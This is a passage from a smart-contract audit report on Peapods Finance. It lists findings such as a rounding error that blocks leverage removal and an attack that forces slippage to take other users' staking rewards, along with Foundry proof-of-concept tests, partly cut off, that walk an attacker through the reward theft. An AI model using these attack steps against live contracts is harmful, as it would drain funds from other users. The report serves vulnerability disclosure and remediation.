        _v3peasDaiPool = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 10_000));
        _v3peasDaiPool.initialize(1 << 96);
        _v3peasDaiPool.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiPool, 100_000 ether);

        _v3peasDaiFlash = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 500));
        _v3peasDaiFlash.initialize(1 << 96);
        _v3peasDaiFlash.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiFlash, 100_000e18);

        _v3SwapRouter = new SwapRouter02(address(_uniV2Factory), address(_uniV3Factory), address(0), address(_weth));
    }

    function _deployProtocolFees() internal {
        _protocolFees = new ProtocolFees();
        _protocolFees.setYieldAdmin(500);
        _protocolFees.setYieldBurn(500);

        _protocolFeeRouter = new ProtocolFeeRouter(_protocolFees);
        bytes memory code = address(_protocolFeeRouter).code;
        vm.etch(0x7d544DD34ABbE24C8832db27820Ff53C151e949b, code);
        _protocolFeeRouter = ProtocolFeeRouter(0x7d544DD34ABbE24C8832db27820Ff53C151e949b);

        vm.prank(_protocolFeeRouter.owner());
        _protocolFeeRouter.transferOwnership(address(this));
        _protocolFeeRouter.setProtocolFees(_protocolFees);
    }

    function _deployRewardsWhitelist() internal {
        _rewardsWhitelist = new RewardsWhitelist();
        bytes memory code = address(_rewardsWhitelist).code;
        vm.etch(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F, code);
        _rewardsWhitelist = RewardsWhitelist(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F);

        vm.prank(_rewardsWhitelist.owner());
        _rewardsWhitelist.transferOwnership(address(this));
        _rewardsWhitelist.toggleRewardsToken(address(_peas), true);
    }

    function _deployTwapUtils() internal {
        _twapUtils = new MockV3TwapUtilities();
        bytes memory code = address(_twapUtils).code;
        vm.etch(0x024ff47D552cB222b265D68C7aeB26E586D5229D, code);
        _twapUtils = MockV3TwapUtilities(0x024ff47D552cB222b265D68C7aeB26E586D5229D);
    }

    function _deployDexAdapter() internal {
        _dexAdapter = new UniswapDexAdapter(_twapUtils, address(_v2SwapRouter), address(_v3SwapRouter), false);
    }

    function _deployIndexUtils() internal {
        _indexUtils = new IndexUtils(_twapUtils, _dexAdapter);
    }

    function _deployWeightedIndexes() internal {
        IDecentralizedIndex.Config memory _c;
        IDecentralizedIndex.Fees memory _f;
        _f.bond = 300;
        _f.debond = 300;
        _f.burn = 5000;
        //_f.sell = 200;
        _f.buy = 200;

        // POD1 (Peas)
        address[] memory _t1 = new address[](1);
        _t1[0] = address(_peas);
        uint256[] memory _w1 = new uint256[](1);
        _w1[0] = 100;
        address __pod1Peas = _createPod(
            "Peas Pod",
            "pPeas",
            _c,
            _f,
            _t1,
            _w1,
            address(0),
            false,
            abi.encode(
                address(_mockDai),
                address(_peas),
                address(_mockDai),
                address(_protocolFeeRouter),
                address(_rewardsWhitelist),
                address(_twapUtils),
                address(_dexAdapter)
            )
        );
        _pod1Peas = WeightedIndex(payable(__pod1Peas));

        _peas.approve(address(_pod1Peas), 100_000 ether);
        _mockDai.approve(address(_pod1Peas), 100_000 ether);
        _pod1Peas.bond(address(_peas), 100_000 ether, 1 ether);
        _pod1Peas.addLiquidityV2(100_000 ether, 100_000 ether, 100, block.timestamp);
    }

    function _deployAutoCompoundingPodLpFactory() internal {
        _aspTKNFactory = new AutoCompoundingPodLpFactory();
    }
    
    function _getAutoCompoundingPodLpAddresses() internal {
        _aspTKN1PeasAddress = _aspTKNFactory.getNewCaFromParams(
            "Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0
        );
    }

    function _deployAspTKNOracles() internal {
        _v2Res = new V2ReservesUniswap();
        _clOracle = new ChainlinkSinglePriceOracle(address(0));
        _uniOracle = new UniswapV3SinglePriceOracle(address(0));
        _diaOracle = new DIAOracleV2SinglePriceOracle(address(0));

        _aspTKNMinOracle1Peas = new aspTKNMinimalOracle(
            address(_aspTKN1PeasAddress),
            abi.encode(
                address(_clOracle),
                address(_uniOracle),
                address(_diaOracle),
                address(_mockDai),
                false,
                false,
                _pod1Peas.lpStakingPool(),
                address(_v3peasDaiPool)
            ),
            abi.encode(address(0), address(0), address(0), address(0), address(0), address(_v2Res))
        );
    }

    function _deployAspTKNs() internal {
        //POD 1
        address _lpPeas = _pod1Peas.lpStakingPool();
        address _stakingPeas = StakingPoolToken(_lpPeas).stakingToken();

        IERC20(_stakingPeas).approve(_lpPeas, 500e18);
        StakingPoolToken(_lpPeas).stake(address(this), 500e18);
        IERC20(_lpPeas).approve(address(_aspTKNFactory), 500e18);

        _aspTKNFactory.create("Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0);
        _aspTKN1Peas = AutoCompoundingPodLp(_aspTKN1PeasAddress);

        IERC20(_lpPeas).approve(address(_aspTKN1Peas), 400e18);
        _aspTKN1Peas.deposit(400e18, address(this));
    }

    function _deployVariableInterestRate() internal {
        _variableInterestRate = new VariableInterestRate(
            "[0.5 0.2@.875 5-10k] 2 days (.75-.85)",
            87500,
            200000000000000000,
            75000,
            85000,
            158247046,
            1582470460,
            3164940920000,
            172800
        );
    }

    function _deployFraxWhitelist() internal {
        _fraxWhitelist = new FraxlendWhitelist();
    }

    function _deployFraxPairRegistry() internal {
        address[] memory _initialDeployers = new address[](0);
        _fraxRegistry = new FraxlendPairRegistry(address(this), _initialDeployers);
    }

    function _deployFraxPairDeployer() internal {
        ConstructorParams memory _params =
            ConstructorParams(circuitBreaker, comptroller, timelock, address(_fraxWhitelist), address(_fraxRegistry));
        _fraxDeployer = new FraxlendPairDeployer(_params);

        _fraxDeployer.setCreationCode(type(FraxlendPair).creationCode);

        address[] memory _whitelistDeployer = new address[](1);
        _whitelistDeployer[0] = address(this);

        _fraxWhitelist.setFraxlendDeployerWhitelist(_whitelistDeployer, true);

        address[] memory _registryDeployer = new address[](1);
        _registryDeployer[0] = address(_fraxDeployer);

        _fraxRegistry.setDeployers(_registryDeployer, true);
    }

    function _deployFraxPairs() internal {
        vm.warp(block.timestamp + 1 days);

        _fraxLPToken1Peas = FraxlendPair(
            _fraxDeployer.deploy(
                abi.encode(
                    _pod1Peas.PAIRED_LP_TOKEN(), // asset
                    _aspTKN1PeasAddress, // collateral
                    address(_aspTKNMinOracle1Peas), //oracle
                    5000, // maxOracleDeviation
                    address(_variableInterestRate), //rateContract
                    1000, //fullUtilizationRate
                    75000, // maxLtv
                    10000, // uint256 _cleanLiquidationFee
                    9000, // uint256 _dirtyLiquidationFee
                    2000 //uint256 _protocolLiquidationFee
                )
            )
        );
    }

    function _deployLendingAssetVault() internal {
        _lendingAssetVault = new LendingAssetVault("Test LAV", "tLAV", address(_mockDai));
        IERC20 vaultAsset1Peas = IERC20(_fraxLPToken1Peas.asset());
        vaultAsset1Peas.approve(address(_fraxLPToken1Peas), vaultAsset1Peas.totalSupply());
        vaultAsset1Peas.approve(address(_lendingAssetVault), vaultAsset1Peas.totalSupply());
        _lendingAssetVault.setVaultWhitelist(address(_fraxLPToken1Peas), true);

        address[] memory _vaults = new address[](1);
        _vaults[0] = address(_fraxLPToken1Peas);
        uint256[] memory _allocations = new uint256[](1);
        _allocations[0] = 100_000e18;
        _lendingAssetVault.setVaultMaxAllocation(_vaults, _allocations);

        vm.prank(timelock);
        _fraxLPToken1Peas.setExternalAssetVault(IERC4626Extended(address(_lendingAssetVault)));
    }

    function _deployLeverageManager() internal {
        _leverageManager = new LeverageManager("Test LM", "tLM", IIndexUtils(address(_indexUtils)));
        _leverageManager.setLendingPair(address(_pod1Peas), address(_fraxLPToken1Peas));
    }

    function _deployFlashSources() internal {
        _uniswapV3FlashSourcePeas = new UniswapV3FlashSource(address(_v3peasDaiFlash), address(_leverageManager));
        _leverageManager.setFlashSource(address(_pod1Peas.PAIRED_LP_TOKEN()), address(_uniswapV3FlashSourcePeas));
    }

    function testPoc() public {
        UniswapV2Pair _v2Pool = UniswapV2Pair(_pod1Peas.DEX_HANDLER().getV2Pool(address(_pod1Peas), address(_mockDai)));
        StakingPoolToken _spTKN = StakingPoolToken(_pod1Peas.lpStakingPool());
        TokenRewards _tokenRewards = TokenRewards(_spTKN.POOL_REWARDS());

        vm.startPrank(alice);
        console.log("\n====== Alice bonds 10_000 PEAS ======"); //Alice bonds 10_000 peas to create fees which then come as rewards in TokenRewards
        _peas.approve(address(_pod1Peas), 10_000e18);
        _pod1Peas.bond(address(_peas), 10_000e18, 0);
        vm.stopPrank();

        vm.startPrank(bob); //Bob sees this and wants to steal the rewards
        console.log("\n====== Bob bonds 1000 PEAS ======");
        _peas.approve(address(_pod1Peas), 1000e18);
        _pod1Peas.bond(address(_peas), 1000e18, 0); //Because Bob, to steal the rewards, needs spTKNs, he first needs to bond his Peas

        console.log("\n====== Bob adds 950 liquidity ======");
        _mockDai.approve(address(_pod1Peas), 950e18);
        _pod1Peas.addLiquidityV2( //Then he adds liquidity to get the LP tokens
            950e18,
            950e18,
            1000,
            block.timestamp
        );

        console.log("\n====== Bob stakes 950 lp ======");
        _v2Pool.approve(address(_spTKN), 950e18);
        _spTKN.stake(bob, 950e18); //The rewards from the pod are transferred to TokenRewards during staking because setShares is called when transfering the spTKNs
    
        console.log("\n====== Bob deposits 950 spTKNs ======");
        console.log("bob _spTKN before: ", _spTKN.balanceOf(bob));
        console.log("rewards in TokenRewards before: ", _peas.balanceOf(address(_tokenRewards)));
        console.log("rewards in AutoCompoundingPodLp before: ", _peas.balanceOf(address(_aspTKN1Peas)));
        _spTKN.approve(address(_aspTKN1Peas), 950e18);
        _aspTKN1Peas.deposit(950e18, bob);
        //This shows that the rewards from TokenRewards were transferred to AutoCompoundingLp but have not yet been compounded, allowing the attacker, who now also has aspTKNs, to receive a part of these rewards
        console.log("rewards in TokenRewards after: ", _peas.balanceOf(address(_tokenRewards)));
        console.log("rewards in AutoCompoundingPodLp after: ", _peas.balanceOf(address(_aspTKN1Peas)));

        console.log("\n====== Bob redeems 950 aspTKNs ======");
        _aspTKN1Peas.redeem(950e18, bob, bob);
        //If you subtract the spTKN balance that the attacker had before the attack, you can see that he now has more tokens
        console.log("bob _spTKN after: ", _spTKN.balanceOf(bob));

        //This shows that there are still some spTKNs as rewards, but there should actually be more because the attacker shouldn't have gotten any
        //The remaining rewards are for the account that has already been deposited into the aspTKN in the setup (see _deployAspTKNs in line 400)
        console.log("_aspTKN spTKN balance: ", _spTKN.balanceOf(address(_aspTKN1Peas)));
        vm.stopPrank();
    }
}
```
3. The POC can then be started with `forge test --mt testPoc -vv --fork-url <FORK_URL>`

# Issue M-8: The amount of shares needed for redemption of borrow tokens is underquoted during the removal of leverage process leading to reverting. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/256 

## Found by 
X77, ZoA, ck, globalace, pkqs90

### Summary

When removing leverage, some additional borrow amount is acquired in the `LeverageManager._acquireBorrowTokenForRepayment` function. The amount needed is however underquoted due to the rounding down nature of the `convertToShares` function. This means not enough amount will be acquired leading to the removing of leverage reverting.

### Root Cause

In `LeverageManager._acquireBorrowTokenForRepayment`, `_borrowAmtNeededToSwap` is acquired to provide enough tokens to repay the flash loan:

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L431-L446


```solidity
        // sell pod token into LP for enough borrow token to get enough to repay
        // if self-lending swap for lending pair then redeem for borrow token
        if (_borrowAmtNeededToSwap > 0) {
            if (_isPodSelfLending(_props.positionId)) {
                _podAmtRemaining = _swapPodForBorrowToken(
                    _pod,
                    positionProps[_props.positionId].lendingPair,
                    _podAmtReceived,
                    IFraxlendPair(positionProps[_props.positionId].lendingPair).convertToShares(_borrowAmtNeededToSwap),
                    _podSwapAmtOutMin
                );
                IFraxlendPair(positionProps[_props.positionId].lendingPair).redeem(
                    IERC20(positionProps[_props.positionId].lendingPair).balanceOf(address(this)),
                    address(this),
                    address(this)
                );
```

As can be seen `convertToShares` is used to determine the equivalent number of shares that should be acquired for redemption into the borrow token. 

`convertToShares` is a rounding down function:

```solidity
    function convertToShares(uint256 _assets) external view returns (uint256 _shares) {
        _shares = toAssetShares(_assets, false, true);
    }
```

```solidity
    function toAssetShares(uint256 _amount, bool _roundUp, bool _previewInterest)
        public
        view
        returns (uint256 _shares)
    {
        if (_previewInterest) {
            (,,,, VaultAccount memory _totalAsset,) = previewAddInterest();
            _shares = _totalAsset.toShares(_amount, _roundUp);
        } else {
            _shares = totalAsset.toShares(_amount, _roundUp);
        }
    }
```

This means that the shares that will be used for the redemption of the borrow tokens will be underquoted.

The redemption process will also lead to a further rounding down compounding the issue:

```solidity
                IFraxlendPair(positionProps[_props.positionId].lendingPair).redeem(
                    IERC20(positionProps[_props.positionId].lendingPair).balanceOf(address(this)),
                    address(this),
                    address(this)
                );
```

```solidity
    function redeem(uint256 _shares, address _receiver, address _owner)
        external
        nonReentrant
        returns (uint256 _amountToReturn)
    {
        if (_receiver == address(0)) revert InvalidReceiver();

        // Check if withdraw is paused and revert if necessary
        if (isWithdrawPaused) revert WithdrawPaused();

        // Accrue interest if necessary
        _addInterest();

        // Pull from storage to save gas
        VaultAccount memory _totalAsset = totalAsset;

        // Calculate the number of assets to transfer based on the shares to burn
        _amountToReturn = _totalAsset.toAmount(_shares, false);
```

```solidity
    function toAmount(VaultAccount memory total, uint256 shares, bool roundUp) internal pure returns (uint256 amount) {
        if (total.shares == 0) {
            amount = shares;
        } else {
            amount = (shares * total.amount) / total.shares;
            if (roundUp && (amount * total.shares) / total.amount < shares) {
                amount = amount + 1;
            }
        }
    }
```

In the end the amount of borrow tokens acquired will be less than the required amount leading to reverting when trying to repay the flash loan.

```solidity
        // pay back flash loan and send remaining to borrower
        uint256 _repayAmount = _d.amount + _d.fee;
        if (_pairedAmtReceived < _repayAmount) {
            _podAmtRemaining = _acquireBorrowTokenForRepayment(
                _props,
                _posProps.pod,
                _d.token,
                _repayAmount - _pairedAmtReceived,
                _podAmtReceived,
                _podSwapAmtOutMin,
                _userProvidedDebtAmtMax
            );
        }
        IERC20(_d.token).safeTransfer(IFlashLoanSource(_getFlashSource(_props.positionId)).source(), _repayAmount);
```

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. User tries to remove leverage.
2. The process reverts due to the error in determining the borrow tokens needed.

### Impact

The remove leverage process reverts leading to a denial of service.

### PoC

_No response_

### Mitigation

Round up the shares needed to be redeemed for the borrow tokens. This is safe because any surplus will later be refunded to the user.

# Issue M-9: Attacker can steal rewards in AutoCompoundingPodLp because he can revert the compounding with slippage 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/274 

## Found by 
Schnilch, X77, pashap9990, rscodes

### Summary

`_processRewardsToPodLp` swaps the reward token into pTKN in order to add liquidity and stake it. However, an attacker can receive rewards they shouldn't by causing slippage during the swap, which causes it to fail. This allows the attacker to deposit without the rewards being compounded. Therefore, when compounding is successful next time, the attacker will receive a portion of those rewards.

### Root Cause

AutoCompoundingPodLp uses `_processRewardsToPodLp` to compound the rewards. To do this, the rewards must first be swapped into pTKNs so that they can be added as liquidity, which then generates LP tokens that can be staked. The problem lies in the swap in `_pairedLpTokenToPodLp`:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L316-L325
When the `podOracle` is set, a minimum amount is calculated that should come out during the swap, with a 5% slippage taken into account. The problem is that an attacker can cause this 5% slippage to occur, which results in the swap being reverted. This means the rewards are not compounded and remain in AutoCompoundingPodLp. The root cause is that new users can receive old rewards that could not previously be compounded.

It is important to note that in TokenRewards, `LEAVE_AS_PAIRED_LP` must be set to true (unless the paired LP token is in the `_allRewardsTokens` list in TokenRewards), otherwise, the paired LP tokens that remain in the contract when the swap in AutoCompoundingLp is reverted will not be compounded because they are not reward tokens. (This is a different bug that I describe in more detail in a separate issue, but I wanted to mention this here as it could limit this bug)

### Internal Pre-conditions

1. `podOracle` must be set in AutoCompoundingPodLp
2. `LEAVE_AS_PAIRED_LP` must be true if the paired LP token is not in the `_allRewardsTokens` list in TokenRewards

### External Pre-conditions

No external pre-conditions

### Attack Path

1. It is assumed that some rewards are currently in AutoCompoundingPodLp
2. An attacker with spTKNs sees this and swaps paired LP tokens into pTKNs
3. The attacker then deposits his spTKNs into AutoCompoundingPodLp, where no rewards can be compounded because the swap is reverted
4. The attacker then swaps the pTKNs back into paired LP tokens, thereby reducing slippage
5. The attacker redeems from AutoCompoundingPodLp, where compounding is possible this time. Due to the compounding, there are more spTKNs in AutoCompoundingPodLp, so the attacker receives more than the amount he initially deposited.

### Impact

A attacker can steal spTKN rewards from other users, causing them to receive fewer rewards.

### PoC

1. To execute the POC, a `POC.t.sol` file should be created in `contracts/test/POC.t.sol`.
2. The following code should be inserted into the file:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {console} from "forge-std/console.sol";

// forge
import {Test} from "forge-std/Test.sol";

// PEAS
import {PEAS} from "../../contracts/PEAS.sol";
import {V3TwapUtilities} from "../../contracts/twaputils/V3TwapUtilities.sol";
import {UniswapDexAdapter} from "../../contracts/dex/UniswapDexAdapter.sol";
import {IDecentralizedIndex} from "../../contracts/interfaces/IDecentralizedIndex.sol";
import {WeightedIndex} from "../../contracts/WeightedIndex.sol";
import {StakingPoolToken} from "../../contracts/StakingPoolToken.sol";
import {LendingAssetVault} from "../../contracts/LendingAssetVault.sol";
import {IndexUtils} from "../../contracts/IndexUtils.sol";
import {IIndexUtils} from "../../contracts/interfaces/IIndexUtils.sol";
import {IndexUtils} from "../contracts/IndexUtils.sol";
import {RewardsWhitelist} from "../../contracts/RewardsWhitelist.sol";
import {TokenRewards} from "../../contracts/TokenRewards.sol";

// oracles
import {ChainlinkSinglePriceOracle} from "../../contracts/oracle/ChainlinkSinglePriceOracle.sol";
import {UniswapV3SinglePriceOracle} from "../../contracts/oracle/UniswapV3SinglePriceOracle.sol";
import {DIAOracleV2SinglePriceOracle} from "../../contracts/oracle/DIAOracleV2SinglePriceOracle.sol";
import {V2ReservesUniswap} from "../../contracts/oracle/V2ReservesUniswap.sol";
import {aspTKNMinimalOracle} from "../../contracts/oracle/aspTKNMinimalOracle.sol";

// protocol fees
import {ProtocolFees} from "../../contracts/ProtocolFees.sol";
import {ProtocolFeeRouter} from "../../contracts/ProtocolFeeRouter.sol";

// autocompounding
import {AutoCompoundingPodLpFactory} from "../../contracts/AutoCompoundingPodLpFactory.sol";
import {AutoCompoundingPodLp} from "../../contracts/AutoCompoundingPodLp.sol";

// lvf
import {LeverageManager} from "../../contracts/lvf/LeverageManager.sol";

// fraxlend
import {FraxlendPairDeployer, ConstructorParams} from "./invariant/modules/fraxlend/FraxlendPairDeployer.sol";
import {FraxlendWhitelist} from "./invariant/modules/fraxlend/FraxlendWhitelist.sol";
import {FraxlendPairRegistry} from "./invariant/modules/fraxlend/FraxlendPairRegistry.sol";
import {FraxlendPair} from "./invariant/modules/fraxlend/FraxlendPair.sol";
import {VariableInterestRate} from "./invariant/modules/fraxlend/VariableInterestRate.sol";
import {IERC4626Extended} from "./invariant/modules/fraxlend/interfaces/IERC4626Extended.sol";

// flash
import {IVault} from "./invariant/modules/balancer/interfaces/IVault.sol";
import {BalancerFlashSource} from "../../contracts/flash/BalancerFlashSource.sol";
import {PodFlashSource} from "../../contracts/flash/PodFlashSource.sol";
import {UniswapV3FlashSource} from "../../contracts/flash/UniswapV3FlashSource.sol";

// uniswap-v2-core
import {UniswapV2Factory} from "v2-core/UniswapV2Factory.sol";
import {UniswapV2Pair} from "v2-core/UniswapV2Pair.sol";

// uniswap-v2-periphery
import {UniswapV2Router02} from "v2-periphery/UniswapV2Router02.sol";

// uniswap-v3-core
import {UniswapV3Factory} from "v3-core/UniswapV3Factory.sol";
import {UniswapV3Pool} from "v3-core/UniswapV3Pool.sol";

// uniswap-v3-periphery
import {SwapRouter02} from "swap-router/SwapRouter02.sol";
import {LiquidityManagement} from "v3-periphery/base/LiquidityManagement.sol";
import {PeripheryPayments} from "v3-periphery/base/PeripheryPayments.sol";
import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";

// mocks
import {WETH9} from "./invariant/mocks/WETH.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./invariant/mocks/MockERC20.sol";
import {TestERC20} from "./invariant/mocks/TestERC20.sol";
import {TestERC4626Vault} from "./invariant/mocks/TestERC4626Vault.sol";
import {MockV3Aggregator} from "./invariant/mocks/MockV3Aggregator.sol";
import {MockUniV3Minter} from "./invariant/mocks/MockUniV3Minter.sol";
import {MockV3TwapUtilities} from "./invariant/mocks/MockV3TwapUtilities.sol";

import {PodHelperTest} from "./helpers/PodHelper.t.sol";

contract AuditTests is PodHelperTest {
    address alice = vm.addr(uint256(keccak256("alice")));
    address bob = vm.addr(uint256(keccak256("bob")));
    address charlie = vm.addr(uint256(keccak256("charlie")));

    uint256[] internal _fraxPercentages = [10000, 2500, 7500, 5000];

    // fraxlend protocol actors
    address internal comptroller = vm.addr(uint256(keccak256("comptroller")));
    address internal circuitBreaker = vm.addr(uint256(keccak256("circuitBreaker")));
    address internal timelock = vm.addr(uint256(keccak256("comptroller")));

    uint16 internal fee = 100;
    uint256 internal PRECISION = 10 ** 27;

    uint256 donatedAmount;
    uint256 lavDeposits;

    /*///////////////////////////////////////////////////////////////
                            TEST CONTRACTS
    ///////////////////////////////////////////////////////////////*/

    PEAS internal _peas;
    MockV3TwapUtilities internal _twapUtils;
    UniswapDexAdapter internal _dexAdapter;
    LendingAssetVault internal _lendingAssetVault;
    LendingAssetVault internal _lendingAssetVault2;
    RewardsWhitelist internal _rewardsWhitelist;

    // oracles
    V2ReservesUniswap internal _v2Res;
    ChainlinkSinglePriceOracle internal _clOracle;
    UniswapV3SinglePriceOracle internal _uniOracle;
    DIAOracleV2SinglePriceOracle internal _diaOracle;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Peas;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Weth;

    // protocol fees
    ProtocolFees internal _protocolFees;
    ProtocolFeeRouter internal _protocolFeeRouter;

    // pods
    WeightedIndex internal _pod1Peas;

    // index utils
    IndexUtils internal _indexUtils;

    // autocompounding
    AutoCompoundingPodLpFactory internal _aspTKNFactory;
    AutoCompoundingPodLp internal _aspTKN1Peas;
    address internal _aspTKN1PeasAddress;

    // lvf
    LeverageManager internal _leverageManager;

    // fraxlend
    FraxlendPairDeployer internal _fraxDeployer;
    FraxlendWhitelist internal _fraxWhitelist;
    FraxlendPairRegistry internal _fraxRegistry;
    VariableInterestRate internal _variableInterestRate;

    FraxlendPair internal _fraxLPToken1Peas;

    // flash
    UniswapV3FlashSource internal _uniswapV3FlashSourcePeas;

    // mocks
    MockUniV3Minter internal _uniV3Minter;
    MockERC20 internal _mockDai;
    WETH9 internal _weth;
    MockERC20 internal _tokenA;
    MockERC20 internal _tokenB;
    MockERC20 internal _tokenC;

    // uniswap-v2-core
    UniswapV2Factory internal _uniV2Factory;
    UniswapV2Pair internal _uniV2Pool;

    // uniswap-v2-periphery
    UniswapV2Router02 internal _v2SwapRouter;

    // uniswap-v3-core
    UniswapV3Factory internal _uniV3Factory;
    UniswapV3Pool internal _v3peasDaiPool;
    UniswapV3Pool internal _v3peasDaiFlash;

    // uniswap-v3-periphery
    SwapRouter02 internal _v3SwapRouter;

    function setUp() public override {
        super.setUp();

        _deployUniV3Minter();
        _deployWETH();
        _deployTokens();
        _deployPEAS();
        _deployUniV2();
        _deployUniV3();
        _deployProtocolFees();
        _deployRewardsWhitelist();
        _deployTwapUtils();
        _deployDexAdapter();
        _deployIndexUtils();
        _deployWeightedIndexes();
        _deployAutoCompoundingPodLpFactory();
        _getAutoCompoundingPodLpAddresses();
        _deployAspTKNOracles();
        _deployAspTKNs();
        _deployVariableInterestRate();
        _deployFraxWhitelist();
        _deployFraxPairRegistry();
        _deployFraxPairDeployer();
        _deployFraxPairs();
        _deployLendingAssetVault();
        _deployLeverageManager();
        _deployFlashSources();
        
        _mockDai.mint(alice, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
        _peas.transfer(alice, 100_000 ether);
        _peas.transfer(bob, 100_000 ether);
        _peas.transfer(charlie, 100_000 ether);
    }

    function _deployUniV3Minter() internal {
        _uniV3Minter = new MockUniV3Minter();
    }

    function _deployWETH() internal {
        _weth = new WETH9();

        vm.deal(address(this), 1_000_000 ether);
        _weth.deposit{value: 1_000_000 ether}();

        vm.deal(address(_uniV3Minter), 2_000_000 ether);
        vm.prank(address(_uniV3Minter));
        _weth.deposit{value: 2_000_000 ether}();
    }

    function _deployTokens() internal {
        _mockDai = new MockERC20();
        _tokenA = new MockERC20();
        _tokenB = new MockERC20();
        _tokenC = new MockERC20();

        _mockDai.initialize("MockDAI", "mDAI", 18);
        _tokenA.initialize("TokenA", "TA", 18);
        _tokenB.initialize("TokenB", "TB", 18);
        _tokenC.initialize("TokenC", "TC", 18);

        _tokenA.mint(address(this), 1_000_000 ether);
        _tokenB.mint(address(this), 1_000_000 ether);
        _tokenC.mint(address(this), 1_000_000 ether);
        _mockDai.mint(address(this), 1_000_000 ether);

        _tokenA.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenB.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenC.mint(address(_uniV3Minter), 1_000_000 ether);
        _mockDai.mint(address(_uniV3Minter), 1_000_000 ether);

        _tokenA.mint(alice, 1_000_000 ether);
        _tokenB.mint(alice, 1_000_000 ether);
        _tokenC.mint(alice, 1_000_000 ether);
        _mockDai.mint(alice, 1_000_000 ether);

        _tokenA.mint(bob, 1_000_000 ether);
        _tokenB.mint(bob, 1_000_000 ether);
        _tokenC.mint(bob, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);

        _tokenA.mint(charlie, 1_000_000 ether);
        _tokenB.mint(charlie, 1_000_000 ether);
        _tokenC.mint(charlie, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
    }

    function _deployPEAS() internal {
        _peas = new PEAS("Peapods", "PEAS");
        _peas.transfer(address(_uniV3Minter), 2_000_000 ether);
    }

    function _deployUniV2() internal {
        _uniV2Factory = new UniswapV2Factory(address(this));
        _v2SwapRouter = new UniswapV2Router02(address(_uniV2Factory), address(_weth));
    }

    function _deployUniV3() internal {
        _uniV3Factory = new UniswapV3Factory();
        _v3peasDaiPool = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 10_000));
        _v3peasDaiPool.initialize(1 << 96);
        _v3peasDaiPool.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiPool, 100_000 ether);

        _v3peasDaiFlash = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 500));
        _v3peasDaiFlash.initialize(1 << 96);
        _v3peasDaiFlash.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiFlash, 100_000e18);

        _v3SwapRouter = new SwapRouter02(address(_uniV2Factory), address(_uniV3Factory), address(0), address(_weth));
    }

    function _deployProtocolFees() internal {
        _protocolFees = new ProtocolFees();
        _protocolFees.setYieldAdmin(500);
        _protocolFees.setYieldBurn(500);

        _protocolFeeRouter = new ProtocolFeeRouter(_protocolFees);
        bytes memory code = address(_protocolFeeRouter).code;
        vm.etch(0x7d544DD34ABbE24C8832db27820Ff53C151e949b, code);
        _protocolFeeRouter = ProtocolFeeRouter(0x7d544DD34ABbE24C8832db27820Ff53C151e949b);

        vm.prank(_protocolFeeRouter.owner());
        _protocolFeeRouter.transferOwnership(address(this));
        _protocolFeeRouter.setProtocolFees(_protocolFees);
    }

    function _deployRewardsWhitelist() internal {
        _rewardsWhitelist = new RewardsWhitelist();
        bytes memory code = address(_rewardsWhitelist).code;
        vm.etch(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F, code);
        _rewardsWhitelist = RewardsWhitelist(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F);

        vm.prank(_rewardsWhitelist.owner());
        _rewardsWhitelist.transferOwnership(address(this));
        _rewardsWhitelist.toggleRewardsToken(address(_peas), true);
    }

    function _deployTwapUtils() internal {
        _twapUtils = new MockV3TwapUtilities();
        bytes memory code = address(_twapUtils).code;
        vm.etch(0x024ff47D552cB222b265D68C7aeB26E586D5229D, code);
        _twapUtils = MockV3TwapUtilities(0x024ff47D552cB222b265D68C7aeB26E586D5229D);
    }

    function _deployDexAdapter() internal {
        _dexAdapter = new UniswapDexAdapter(_twapUtils, address(_v2SwapRouter), address(_v3SwapRouter), false);
    }

    function _deployIndexUtils() internal {
        _indexUtils = new IndexUtils(_twapUtils, _dexAdapter);
    }

    function _deployWeightedIndexes() internal {
        IDecentralizedIndex.Config memory _c;
        IDecentralizedIndex.Fees memory _f;
        _f.bond = 300;
        _f.debond = 300;
        _f.burn = 5000;
        //_f.sell = 200;
        _f.buy = 200;

        // POD1 (Peas)
        address[] memory _t1 = new address[](1);
        _t1[0] = address(_peas);
        uint256[] memory _w1 = new uint256[](1);
        _w1[0] = 100;
        address __pod1Peas = _createPod(
            "Peas Pod",
            "pPeas",
            _c,
            _f,
            _t1,
            _w1,
            address(0),
            true,
            abi.encode(
                address(_mockDai),
                address(_peas),
                address(_mockDai),
                address(_protocolFeeRouter),
                address(_rewardsWhitelist),
                address(_twapUtils),
                address(_dexAdapter)
            )
        );
        _pod1Peas = WeightedIndex(payable(__pod1Peas));

        _peas.approve(address(_pod1Peas), 100_000 ether);
        _mockDai.approve(address(_pod1Peas), 100_000 ether);
